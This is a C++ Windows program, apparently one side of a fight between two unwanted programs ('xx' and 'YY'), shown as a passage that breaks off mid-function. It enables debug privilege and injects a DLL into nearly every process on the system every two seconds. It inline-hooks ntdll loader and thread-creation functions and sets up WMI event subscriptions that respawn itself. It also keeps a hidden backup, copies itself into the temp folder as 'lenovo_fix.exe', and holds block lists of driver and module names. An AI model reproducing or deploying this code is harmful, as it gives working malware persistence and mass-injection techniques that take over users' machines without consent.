#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>
#include <iomanip>
#include <sstream>
#include <objbase.h>
#include <wbemidl.h>
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

// ============================================================================
// 1. NT 内核未公开结构体与前置声明区域
// ============================================================================
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

static void LogAction(const std::string& text);
static void LockDownMaliciousFileNodes();
static void ReleaseFileLocks();
static DWORD WINAPI MutexHoldThread(LPVOID lpParam);
static void LockDownBbyovdChannels();
static void ForceLockDllInjection();
static void ForceLockRemoteCall();
static bool EnableDebugPrivilege();
static bool CheckNameMatch(const wchar_t* a, const wchar_t* b);
static bool InjectIntoPid(DWORD pid, const wchar_t* path);
static bool IsProtectedProcess(const wchar_t* name);

// ---- 全局配置区域 —— 精确配置 ----
const wchar_t* GOAL_NAME = L"xx.exe";
const wchar_t* SHOW_TITLE = L"YY_Defensive_GUI";
const wchar_t* GUARD_DLL = L"yyguard.dll";
const wchar_t* HONEYPOT_EXE_NAME = L"lenovo_fix.exe";

const wchar_t* BAD_MODULES[] = {
    L"svcguard.dll", L"window.dll", L"atkcore.dll",
    L"payload.dll",  L"defense.dll",
    L"DeamonWindows.dll", L"deamon.dll"
};
const int BAD_COUNT = 7;

const wchar_t* HOOD_LIST[] = {
    L"explorer.exe", L"svchost.exe", L"lsass.exe", L"cmd.exe"
};
const int HOOD_COUNT = 4;

const wchar_t* BYOVD_DEVICES[] = {
    L"\\\\.\\BootRepair", L"\\\\.\\kdmapper", L"\\\\.\\kdu", L"\\\\.\\GIO"
};
const int BYOVD_COUNT = 4;

// ---- 全局控制句柄池 ----
HANDLE g_hEnemyMutexLock = NULL;
HANDLE g_hDeviceLocks[BYOVD_COUNT] = { INVALID_HANDLE_VALUE };
HANDLE g_hMaliciousFileLocks[BAD_COUNT] = { INVALID_HANDLE_VALUE };

HWND g_hLogBox = NULL;
HWND g_hMainWnd = NULL;
CRITICAL_SECTION g_LockBox;

void* g_pMainTextBase = nullptr;
SIZE_T g_dwTextSize = 0;
BYTE* g_pOriginalImageBackup = nullptr;

DWORD g_HoneypotTriggeredPID = 0;

typedef LONG(NTAPI* fnSuspend)(HANDLE hProc);
fnSuspend pfnSuspend = nullptr;

typedef LONG(NTAPI* fnSuspendThread)(HANDLE hThread, PULONG pPreviousSuspendCount);
fnSuspendThread pfnSuspendThread = nullptr;

// ---- Hook 动态跳转与原始字节恢复全局冷备份 ----
unsigned char g_OriginalLdrBytes[14] = { 0 };
unsigned char g_JmpLdrBytes[14] = { 0 };

typedef NTSTATUS(NTAPI* fnLdrLoadDll)(PWSTR PathToFile, PULONG Flags, PUNICODE_STRING ModuleFileName, PHANDLE ModuleHandle);
typedef NTSTATUS(NTAPI* fnCreateThread)(PHANDLE th, ACCESS_MASK ac, PVOID obj, HANDLE pr, PVOID st, PVOID arg, ULONG fl, ULONG_PTR z, SIZE_T sk, SIZE_T mx, PVOID at);

fnLdrLoadDll g_TrampolineLdrLoadDll = nullptr;
fnCreateThread g_TrampolineCreateThread = nullptr;

// ============================================================================
// x64 指令长度解码器：跨指令边界 hook 的核心，避免截断指令导致崩溃
// ============================================================================
static SIZE_T X64InstructionLength(const BYTE* code) {
    const BYTE* p = code;
    BYTE rex = 0;

    // 前缀（66/67/F0/F2/F3/段覆盖）与 REX
    for (;;) {
        BYTE b = *p;
        if (b == 0x66 || b == 0x67 || b == 0xF0 || b == 0xF2 || b == 0xF3 ||
            b == 0x2E || b == 0x36 || b == 0x3E || b == 0x26 || b == 0x64 || b == 0x65) {
            ++p;
        } else if (b >= 0x40 && b <= 0x4F) {
            rex = b; ++p;
        } else {
            break;
        }
    }

    BYTE op = *p++;

    auto parseModRm = [&](SIZE_T immBytes) {
        BYTE modrm = *p++;
        BYTE mod = (modrm >> 6) & 3;
        BYTE rm  = modrm & 7;
        if (mod != 3 && rm == 4) {
            BYTE sib = *p++;
            if (mod == 0 && (sib & 7) == 5) p += 4; // [disp32]
        }
        if (mod == 1) p += 1;                       // [reg+disp8]
        else if (mod == 2) p += 4;                  // [reg+disp32]
        else if (mod == 0 && rm == 5) p += 4;       // [disp32]
        p += immBytes;
    };

    if (op == 0x0F) {
        BYTE op2 = *p++;
        if (op2 == 0x38 || op2 == 0x3A) {
            ++p; // 三字节 opcode
            parseModRm(op2 == 0x3A ? 1 : 0);
        } else {
            switch (op2) {
                case 0x05: case 0x0B: case 0x0E: // syscall / ud2 / femms：无 ModRM
                    break;
                case 0x80: case 0x81: case 0x82: case 0x83:
                case 0x84: case 0x85: case 0x86: case 0x87:
                case 0x88: case 0x89: case 0x8A: case 0x8B:
                case 0x8C: case 0x8D: case 0x8E: case 0x8F: // Jcc rel32
                    p += 4; break;
                case 0xBA: // bt/bts/btr/btc r/m, imm8
                    parseModRm(1); break;
                default:
                    parseModRm(0); break;
            }
        }
    } else {
        switch (op) {
            // 无 ModRM
            case 0x50: case 0x51: case 0x52: case 0x53: case 0x54: case 0x55: case 0x56: case 0x57:
            case 0x58: case 0x59: case 0x5A: case 0x5B: case 0x5C: case 0x5D: case 0x5E: case 0x5F:
            case 0x90: case 0xC3: case 0xC9: case 0x9C: case 0x9D: case 0xCC: case 0xF4:
                break;
            case 0xC2: p += 2; break;                  // ret imm16
            case 0xE8: case 0xE9: p += 4; break;       // call/jmp rel32
            case 0xEB: p += 1; break;                  // jmp rel8
            case 0x70: case 0x71: case 0x72: case 0x73: case 0x74: case 0x75: case 0x76: case 0x77:
            case 0x78: case 0x79: case 0x7A: case 0x7B: case 0x7C: case 0x7D: case 0x7E: case 0x7F:
                p += 1; break;                         // Jcc rel8
            case 0xB0: case 0xB1: case 0xB2: case 0xB3: case 0xB4: case 0xB5: case 0xB6: case 0xB7:
                p += 1; break;                         // mov r8, imm8
            case 0xB8: case 0xB9: case 0xBA: case 0xBB: case 0xBC: case 0xBD: case 0xBE: case 0xBF:
                p += (rex & 0x08) ? 8 : 4; break;      // mov r, imm
            case 0x6A: p += 1; break;                  // push imm8
            case 0x68: p += 4; break;                  // push imm32
            case 0xCD: p += 1; break;                  // int imm8
            case 0xA0: case 0xA1: case 0xA2: case 0xA3: p += 8; break; // moffs
            // 带 ModRM 且带立即数
            case 0x80: case 0x82: parseModRm(1); break; // group1 imm8
            case 0x81: parseModRm(4); break;            // group1 imm32
            case 0x83: parseModRm(1); break;            // group1 imm8（符号扩展）
            case 0xC0: case 0xC1: parseModRm(1); break; // 移位 imm8
            case 0xC6: parseModRm(1); break;            // mov r/m8, imm8
            case 0xC7: parseModRm(4); break;            // mov r/m, imm32
            case 0xF6: parseModRm(1); break;            // test/not/mul/div r/m8, imm8
            case 0xF7: parseModRm(4); break;            // test/not/mul/div r/m, imm32
            case 0x69: parseModRm(4); break;            // imul r, r/m, imm32
            case 0x6B: parseModRm(1); break;            // imul r, r/m, imm8
            default: parseModRm(0); break;
        }
    }
    return (SIZE_T)(p - code);
}

// 构建跨指令边界的跳板：拷贝原函数前若干条完整指令，尾部接绝对跳转回原函数。
static void* BuildTrampoline(void* pOriginal, SIZE_T* outStolenBytes) {
    const BYTE* src = (const BYTE*)pOriginal;
    SIZE_T n = 0;
    while (n < 14) {                       // 至少盖住 12 字节的绝对跳转
        SIZE_T l = X64InstructionLength(src + n);
        if (l == 0 || n + l > 128) return nullptr;
        n += l;
    }

    BYTE* tramp = (BYTE*)VirtualAlloc(NULL, n + 12, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!tramp) return nullptr;

    memcpy(tramp, src, n);
    BYTE jmpBack[12] = { 0x48, 0xB8, 0,0,0,0,0,0,0,0, 0xFF, 0xE0 };
    ULONG_PTR back = (ULONG_PTR)src + n;
    memcpy(jmpBack + 2, &back, sizeof(back));
    memcpy(tramp + n, jmpBack, sizeof(jmpBack));

    DWORD old;
    VirtualProtect(tramp, n + 12, PAGE_EXECUTE_READ, &old);
    if (outStolenBytes) *outStolenBytes = n;
    return tramp;
}

// 向目标地址写入 12 字节绝对跳转（mov rax, dst; jmp rax）。
static bool WriteAbsJump(void* pTarget, void* pDest) {
    BYTE stub[12] = { 0x48, 0xB8, 0,0,0,0,0,0,0,0, 0xFF, 0xE0 };
    memcpy(stub + 2, &pDest, sizeof(pDest));
    DWORD old;
    if (!VirtualProtect(pTarget, 12, PAGE_EXECUTE_READWRITE, &old)) return false;
    memcpy(pTarget, stub, 12);
    VirtualProtect(pTarget, 12, old, &old);
    return true;
}

// ============================================================================
// 2. 基础日志与同步锁核心
// ============================================================================
static void LogAction(const std::string& text) {
    EnterCriticalSection(&g_LockBox);
    SYSTEMTIME t; GetLocalTime(&t); std::stringstream ss;
    ss << "[" << std::setw(2) << std::setfill('0') << t.wDay << "-"
        << std::setw(2) << std::setfill('0') << t.wMonth << "-"
        << std::setw(2) << std::setfill('0') << t.wSecond << "] " << text << "\r\n";
    std::string s = ss.str(); std::cout << s;
    if (g_hLogBox && IsWindow(g_hLogBox)) {
        int v = GetWindowTextLengthA(g_hLogBox);
        SendMessageA(g_hLogBox, EM_SETSEL, v, v);
        SendMessageA(g_hLogBox, EM_REPLACESEL, FALSE, (LPARAM)s.c_str());
    }
    LeaveCriticalSection(&g_LockBox);
}

// ============================================================================
// 3. 磁盘静态组件死锁与设备占坑矩阵
// ============================================================================
// 以程序所在目录 + 文件名拼出绝对路径（占坑锁与删除共用，避免相对路径错删）
static void ResolveNextToExe(const wchar_t* name, wchar_t* out, size_t outChars) {
    out[0] = L'\0';
    if (!name || outChars == 0) return;
    wchar_t runPath[MAX_PATH] = { 0 };
    if (!GetModuleFileNameW(NULL, runPath, MAX_PATH)) return;
    wchar_t* slash = wcsrchr(runPath, L'\\');
    if (slash) *(slash + 1) = L'\0';
    lstrcpynW(out, runPath, (int)outChars);
    size_t used = lstrlenW(out);
    if (used + 1 < outChars) lstrcpynW(out + used, name, (int)(outChars - used));
}

static void LockDownMaliciousFileNodes() {
    EnterCriticalSection(&g_LockBox);
    for (int i = 0; i < BAD_COUNT; i++) {
        if (g_hMaliciousFileLocks[i] != INVALID_HANDLE_VALUE) continue;

        wchar_t absoluteFilePath[MAX_PATH * 2] = { 0 };
        ResolveNextToExe(BAD_MODULES[i], absoluteFilePath, MAX_PATH * 2);
        if (!absoluteFilePath[0]) continue;

        g_hMaliciousFileLocks[i] = CreateFileW(
            absoluteFilePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
        );
    }
    LeaveCriticalSection(&g_LockBox);
}

static void ReleaseFileLocks() {
    EnterCriticalSection(&g_LockBox);
    for (int i = 0; i < BAD_COUNT; i++) {
        if (g_hMaliciousFileLocks[i] != INVALID_HANDLE_VALUE) {
            CloseHandle(g_hMaliciousFileLocks[i]);
            g_hMaliciousFileLocks[i] = INVALID_HANDLE_VALUE;
        }
    }
    LeaveCriticalSection(&g_LockBox);
}

// 抢死对手弹窗互斥锁：xx 的 window.dll 靠这个锁决定谁能弹窗。
// 同时占 Global\ 和本地会话两个名字（xx 已把锁改成本地会话锁），抢到永久持有。
static DWORD WINAPI HoldMutexForever(LPVOID lpName) {
    const wchar_t* name = (const wchar_t*)lpName;
    HANDLE h = CreateMutexW(NULL, FALSE, name);
    if (!h) return 0;
    while (true) {
        DWORD w = WaitForSingleObject(h, 0);
        if (w == WAIT_OBJECT_0 || w == WAIT_ABANDONED) {
            for (;;) Sleep(60000);   // 永久持有，不释放
        }
        Sleep(5);
    }
    return 0;
}

static DWORD WINAPI MutexHoldThread(LPVOID lpParam) {
    (void)lpParam;
    static wchar_t gname[] = L"Global\\xx_window_guard";
    static wchar_t lname[] = L"xx_window_guard";
    static wchar_t mname[] = L"xx_window_make_guard";
    HANDLE t1 = CreateThread(NULL, 0, HoldMutexForever, gname, 0, NULL);
    if (t1) CloseHandle(t1);
    HANDLE t2 = CreateThread(NULL, 0, HoldMutexForever, lname, 0, NULL);
    if (t2) CloseHandle(t2);
    HANDLE t3 = CreateThread(NULL, 0, HoldMutexForever, mname, 0, NULL);
    if (t3) CloseHandle(t3);
    return 0;
}

// 删除 xx 的 WMI 复活订阅（__EventFilter "XX_RespawnFilter" + CommandLineEventConsumer）
static void DeleteEnemyWmiSubscription() {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return;
    IWbemLocator* pLoc = NULL;
    IWbemServices* pSvc = NULL;
    wchar_t ns[] = L"ROOT\\CIMV2";
    wchar_t fp[] = L"__EventFilter.Name=\"XX_RespawnFilter\"";
    wchar_t cp[] = L"CommandLineEventConsumer.Name=\"XX_RespawnConsumer\"";
    hr = CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (void**)&pLoc);
    if (SUCCEEDED(hr) && pLoc) {
        hr = pLoc->ConnectServer(ns, NULL, NULL, NULL, 0, NULL, NULL, &pSvc);
        if (SUCCEEDED(hr) && pSvc) {
            CoSetProxyBlanket((IUnknown*)pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                              RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
            pSvc->DeleteInstance(fp, 0, NULL, NULL);
            pSvc->DeleteInstance(cp, 0, NULL, NULL);
            pSvc->Release();
        }
        pLoc->Release();
    }
    CoUninitialize();
}

// 周期性清除 xx 的 WMI 复活订阅
static DWORD WINAPI WmiKillerThread(LPVOID lpParam) {
    (void)lpParam;
    while (true) {
        DeleteEnemyWmiSubscription();
        Sleep(5000);
    }
    return 0;
}

// 创建 YY 自己的 WMI 复活订阅：yy.exe 被杀时自动拉起（不依赖 DLL 注入）
static void CreateOwnWmiRespawn() {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return;
    IWbemLocator* pLoc = NULL;
    IWbemServices* pSvc = NULL;
    wchar_t ns[] = L"ROOT\\CIMV2";
    wchar_t wFilter[] = L"__EventFilter";
    wchar_t wConsumer[] = L"CommandLineEventConsumer";
    wchar_t wBinding[] = L"__FilterToConsumerBinding";
    wchar_t exePath[MAX_PATH];
    if (!GetModuleFileNameW(NULL, exePath, MAX_PATH)) { CoUninitialize(); return; }
    wchar_t cmd[1024];
    wchar_t bakPath[MAX_PATH];
    wcscpy_s(bakPath, exePath);
    wchar_t* bsl = wcsrchr(bakPath, L'\\');
    if (bsl) { bsl[1] = L'\0'; wcscat_s(bakPath, L"yyres.bin"); }
    swprintf_s(cmd, L"cmd.exe /c if not exist \"%s\" copy /y \"%s\" \"%s\" & start \"\" \"%s\"", exePath, bakPath, exePath, exePath);

    hr = CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (void**)&pLoc);
    if (FAILED(hr) || !pLoc) { CoUninitialize(); return; }
    hr = pLoc->ConnectServer(ns, NULL, NULL, NULL, 0, NULL, NULL, &pSvc);
    if (FAILED(hr) || !pSvc) { pLoc->Release(); CoUninitialize(); return; }
    CoSetProxyBlanket((IUnknown*)pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);

    IWbemClassObject* pFilterClass = NULL, * pFilterInst = NULL;
    IWbemClassObject* pConsumerClass = NULL, * pConsumerInst = NULL;
    IWbemClassObject* pBindingClass = NULL, * pBindingInst = NULL;
    VARIANT v; VariantInit(&v);

    if (SUCCEEDED(pSvc->GetObject(wFilter, 0, NULL, &pFilterClass, NULL)) && pFilterClass &&
        SUCCEEDED(pFilterClass->SpawnInstance(0, &pFilterInst)) && pFilterInst) {
        v.vt = VT_BSTR; v.bstrVal = SysAllocString(L"YY_RespawnFilter"); pFilterInst->Put(L"Name", 0, &v, 0); VariantClear(&v);
        v.vt = VT_BSTR; v.bstrVal = SysAllocString(L"WQL"); pFilterInst->Put(L"QueryLanguage", 0, &v, 0); VariantClear(&v);
        v.vt = VT_BSTR; v.bstrVal = SysAllocString(L"root\\cimv2"); pFilterInst->Put(L"EventNamespace", 0, &v, 0); VariantClear(&v);
        v.vt = VT_BSTR; v.bstrVal = SysAllocString(L"SELECT * FROM __InstanceDeletionEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'yy.exe'"); pFilterInst->Put(L"Query", 0, &v, 0); VariantClear(&v);
        pSvc->PutInstance(pFilterInst, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    }
    if (SUCCEEDED(pSvc->GetObject(wConsumer, 0, NULL, &pConsumerClass, NULL)) && pConsumerClass &&
        SUCCEEDED(pConsumerClass->SpawnInstance(0, &pConsumerInst)) && pConsumerInst) {
        v.vt = VT_BSTR; v.bstrVal = SysAllocString(L"YY_RespawnConsumer"); pConsumerInst->Put(L"Name", 0, &v, 0); VariantClear(&v);
        v.vt = VT_BSTR; v.bstrVal = SysAllocString(cmd); pConsumerInst->Put(L"CommandLineTemplate", 0, &v, 0); VariantClear(&v);
        pSvc->PutInstance(pConsumerInst, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    }
    if (SUCCEEDED(pSvc->GetObject(wBinding, 0, NULL, &pBindingClass, NULL)) && pBindingClass &&
        SUCCEEDED(pBindingClass->SpawnInstance(0, &pBindingInst)) && pBindingInst) {
        v.vt = VT_BSTR; v.bstrVal = SysAllocString(L"__EventFilter.Name=\"YY_RespawnFilter\""); pBindingInst->Put(L"Filter", 0, &v, 0); VariantClear(&v);
        v.vt = VT_BSTR; v.bstrVal = SysAllocString(L"CommandLineEventConsumer.Name=\"YY_RespawnConsumer\""); pBindingInst->Put(L"Consumer", 0, &v, 0); VariantClear(&v);
        pSvc->PutInstance(pBindingInst, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    }

    if (pBindingInst) pBindingInst->Release();
    if (pBindingClass) pBindingClass->Release();
    if (pConsumerInst) pConsumerInst->Release();
    if (pConsumerClass) pConsumerClass->Release();
    if (pFilterInst) pFilterInst->Release();
    if (pFilterClass) pFilterClass->Release();
    pSvc->Release();
    pLoc->Release();
    CoUninitialize();
}

// 周期性维护 YY 自己的 WMI 复活订阅
static DWORD WINAPI WmiRespawnThread(LPVOID lpParam) {
    (void)lpParam;
    while (true) {
        CreateOwnWmiRespawn();
        Sleep(10000);
    }
    return 0;
}

// 自保：持续维护 yyres.bin 备份，yy.exe 被 xx 删除后由 yyguard.dll/WMI 还原
static DWORD WINAPI SelfProtectThread(LPVOID lpParam) {
    (void)lpParam;
    WCHAR self[MAX_PATH], bak[MAX_PATH];
    GetModuleFileNameW(NULL, self, MAX_PATH);
    wcscpy_s(bak, self);
    wchar_t* s = wcsrchr(bak, L'\\');
    if (s) { s[1] = L'\0'; wcscat_s(bak, L"yyres.bin"); }
    while (true) {
        if (GetFileAttributesW(bak) == INVALID_FILE_ATTRIBUTES) {
            CopyFileW(self, bak, FALSE);
        }
        Sleep(1000);
    }
    return 0;
}

static void LockDownBbyovdChannels() {
    for (int i = 0; i < BYOVD_COUNT; i++) {
        g_hDeviceLocks[i] = CreateFileW(BYOVD_DEVICES[i], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    }
}

// ============================================================================
// 4. LdrLoadDll 动态恢复防递归流控引擎
// ============================================================================
static NTSTATUS NTAPI SpyLdrLoadDll(PWSTR PathToFile, PULONG Flags, PUNICODE_STRING ModuleFileName, PHANDLE ModuleHandle) {
    if (ModuleFileName && ModuleFileName->Buffer) {
        if (wcsstr(ModuleFileName->Buffer, GUARD_DLL) != nullptr) {
            return g_TrampolineLdrLoadDll(PathToFile, Flags, ModuleFileName, ModuleHandle);
        }

        for (int i = 0; i < BAD_COUNT; i++) {
            if (wcsstr(ModuleFileName->Buffer, BAD_MODULES[i]) != nullptr) {
                LogAction("DLL Shield: Prevented malicious loader from attaching components.");
                return 0xC0000022;
            }
        }
    }
    return g_TrampolineLdrLoadDll(PathToFile, Flags, ModuleFileName, ModuleHandle);
}

static void ForceLockDllInjection() {
    HMODULE hMod = GetModuleHandleA("ntdll.dll"); if (!hMod) return;
    void* pLdrLoad = (void*)GetProcAddress(hMod, "LdrLoadDll");
    if (!pLdrLoad) return;

    SIZE_T stolen = 0;
    void* tramp = BuildTrampoline(pLdrLoad, &stolen);
    if (!tramp) { LogAction("DLL Shield: trampoline build failed."); return; }
    g_TrampolineLdrLoadDll = (fnLdrLoadDll)tramp;

    if (!WriteAbsJump(pLdrLoad, (void*)SpyLdrLoadDll)) {
        LogAction("DLL Shield: hook install failed.");
        return;
    }
    LogAction("DLL Shield: Trampoline bridged at ntdll!LdrLoadDll.");
}

// 判断线程创建目标是否为己方（自身）或己方需要注入的常驻名单进程，放行合法注入
static bool IsHoodInjectTarget(HANDLE pr) {
    if (pr == GetCurrentProcess()) return true;
    DWORD pid = GetProcessId(pr);
    if (pid == 0) return false;
    if (pid == GetCurrentProcessId()) return true;

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32W pe = { sizeof(PROCESSENTRY32W) };
    bool allowed = false;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (pe.th32ProcessID == pid) {
                for (int i = 0; i < HOOD_COUNT; i++) {
                    if (CheckNameMatch(pe.szExeFile, HOOD_LIST[i])) { allowed = true; break; }
                }
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return allowed;
}

static NTSTATUS NTAPI SpyCreateThread(PHANDLE th, ACCESS_MASK ac, PVOID obj, HANDLE pr, PVOID st, PVOID arg, ULONG fl, ULONG_PTR z, SIZE_T sk, SIZE_T mx, PVOID at) {
    if (!IsHoodInjectTarget(pr)) {
        LogAction("Shield Notice: Blocked remote thread initialization protocol.");
        return 0;
    }
    return g_TrampolineCreateThread(th, ac, obj, pr, st, arg, fl, z, sk, mx, at);
}

static void ForceLockRemoteCall() {
    HMODULE hMod = GetModuleHandleA("ntdll.dll"); if (!hMod) return;
    void* pCreateThread = (void*)GetProcAddress(hMod, "NtCreateThreadEx");
    if (!pCreateThread) return;

    SIZE_T stolen = 0;
    void* tramp = BuildTrampoline(pCreateThread, &stolen);
    if (!tramp) { LogAction("Shield Notice: remote-call trampoline build failed."); return; }
    g_TrampolineCreateThread = (fnCreateThread)tramp;

    if (!WriteAbsJump(pCreateThread, (void*)SpyCreateThread)) {
        LogAction("Shield Notice: remote-call hook install failed.");
        return;
    }
    LogAction("Shield Notice: remote thread hook armed.");
}

static DWORD WINAPI ShieldWorker(LPVOID lpParamToken) {
    HMODULE hMod = GetModuleHandleA("kernel32.dll"); if (!hMod) return 0;
    void* pTarget = (void*)GetProcAddress(hMod, "TerminateProcess"); if (!pTarget) return 0;

    unsigned char localCache[5] = { 0 };
    memcpy(localCache, pTarget, 5);

    while (true) {
        DWORD op;
        if (VirtualProtect(pTarget, 5, PAGE_EXECUTE_READWRITE, &op)) {
            memcpy(pTarget, localCache, 5);
            VirtualProtect(pTarget, 5, op, &op);
        }
        Sleep(30);
    }
    return 0;
}

static bool EnableDebugPrivilege() {
    HANDLE hToken = NULL;
    LUID luid = { 0 };
    TOKEN_PRIVILEGES tp = { 0 };
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
                CloseHandle(hToken);
                return (GetLastError() == ERROR_SUCCESS);
            }
        }
        CloseHandle(hToken);
    }
    return false;
}
static bool CheckNameMatch(const wchar_t* a, const wchar_t* b) {
    if (!a || !b) return false;
    while (*a && *b) { if (towupper(*a) != towupper(*b)) return false; a++; b++; }
    return (*a == L'\0' && *b == L'\0');
}
// 受保护进程（不注入）：系统进程注入会卡死系统，恢复跳过
static bool IsProtectedProcess(const wchar_t* name) {
    static const wchar_t* list[] = {
        L"System", L"smss.exe", L"csrss.exe", L"wininit.exe",
        L"services.exe", L"lsass.exe", L"winlogon.exe",
        L"spoolsv.exe", L"dwm.exe", L"taskhost.exe", NULL
    };
    for (int i = 0; list[i]; i++)
        if (CheckNameMatch(name, list[i])) return true;
    return false;
}

// 向指定 PID 注入 DLL（用最小权限集，避免被拒）
static bool InjectIntoPid(DWORD pid, const wchar_t* path) {
    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc) return false;
    size_t sz = (lstrlenW(path) + 1) * sizeof(wchar_t);
    LPVOID ptr = VirtualAllocEx(hProc, NULL, sz, MEM_COMMIT, PAGE_READWRITE);
    bool ok = false;
    if (ptr) {
        if (WriteProcessMemory(hProc, ptr, path, sz, NULL)) {
            PTHREAD_START_ROUTINE pLoad = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryW");
            if (pLoad) {
                HANDLE hTh = CreateRemoteThread(hProc, NULL, 0, pLoad, ptr, 0, NULL);
                if (hTh) { WaitForSingleObject(hTh, 2000); CloseHandle(hTh); ok = true; }
            }
        }
        VirtualFreeEx(hProc, ptr, 0, MEM_RELEASE);
    }
    CloseHandle(hProc);
    return ok;
}

static DWORD WINAPI ServiceWorker(LPVOID lpParamToken) {
    EnableDebugPrivilege();
    // 用 exe 所在目录解析 yyguard.dll（不能用 cwd）
    wchar_t exeDir[MAX_PATH];
    GetModuleFileNameW(NULL, exeDir, MAX_PATH);
    wchar_t* slash = wcsrchr(exeDir, L'\\');
    if (slash) slash[1] = L'\0';
    wchar_t fPath[MAX_PATH];
    wcscpy_s(fPath, exeDir);
    wcscat_s(fPath, GUARD_DLL);

    int round = 0;
    while (true) {
        int okCount = 0;
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = { sizeof(PROCESSENTRY32W) };
            if (Process32FirstW(hSnap, &pe)) {
                do {
                    if (pe.th32ProcessID <= 4) continue;
                    if (pe.th32ProcessID == GetCurrentProcessId()) continue;
                    if (IsProtectedProcess(pe.szExeFile)) continue;
                    if (InjectIntoPid(pe.th32ProcessID, fPath)) okCount++;
                } while (Process32NextW(hSnap, &pe));
            }
            CloseHandle(hSnap);
        }
        if (++round % 5 == 0) {
            LogAction("Spread: yyguard.dll injected into " + std::to_string(okCount) + " procs.");
        }
        Sleep(2000);
    }
    return 0;
}
static DWORD WINAPI HoneypotDecoyWorker(LPVOID lpParam) {
    EnableDebugPrivilege();
    wchar_t currentExePath[MAX_PATH]; GetModuleFileNameW(NULL, currentExePath, MAX_PATH);
    wchar_t targetBaitPath[MAX_PATH] = { 0 };
    DWORD dwLen = GetTempPathW(MAX_PATH, targetBaitPath);
    if (dwLen > 0 && dwLen < MAX_PATH - 20) {
        lstrcatW(targetBaitPath, HONEYPOT_EXE_NAME);
        CopyFileW(currentExePath, targetBaitPath, FALSE);
    }
    else {
        return 0;
    }
    while (true) {
        bool honeypotAlive = false;
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = { sizeof(PROCESSENTRY32W) };
            if (Process32FirstW(hSnap, &pe)) {
                do { if (CheckNameMatch(pe.szExeFile, HONEYPOT_EXE_NAME)) { honeypotAlive = true; break; } } while (Process32NextW(hSnap, &pe));
            }
            CloseHandle(hSnap);
        }
        if (!honeypotAlive) {
            STARTUPINFOW si = { sizeof(si) }; PROCESS_INFORMATION pi;
            wchar_t cmdLine[MAX_PATH + 5] = { 0 };
            // 完美修复 2：彻底砸碎全角双引号和孤立变量名，格式化对齐为标准的宽字符转义双引号形式传递
            wsprintfW(cmdLine, L"\"%s\"", targetBaitPath);;
            if (CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                CloseHandle(pi.hProcess); CloseHandle(pi.hThread); LogAction("Honeypot Bait deployed safely in isolation zone.");
            }
        }
        Sleep(2000);
    }
    return 0;
}
// 卸载指定进程里加载的敌方 DLL（window.dll/svcguard.dll 等），不杀宿主进程。
// 这样既能压掉 xx 的兜底窗，又不误杀自己注入 yyguard.dll 的宿主。
static void UnloadBadDllsFromProcess(DWORD pid) {
    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc) return;
    HANDLE mSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (mSnap != INVALID_HANDLE_VALUE) {
        MODULEENTRY32W me = { sizeof(MODULEENTRY32W) };
        if (Module32FirstW(mSnap, &me)) {
            do {
                for (int k = 0; k < BAD_COUNT; k++) {
                    if (CheckNameMatch(me.szModule, BAD_MODULES[k])) {
                        FARPROC pFree = GetProcAddress(GetModuleHandleA("kernel32.dll"), "FreeLibrary");
                        if (pFree) {
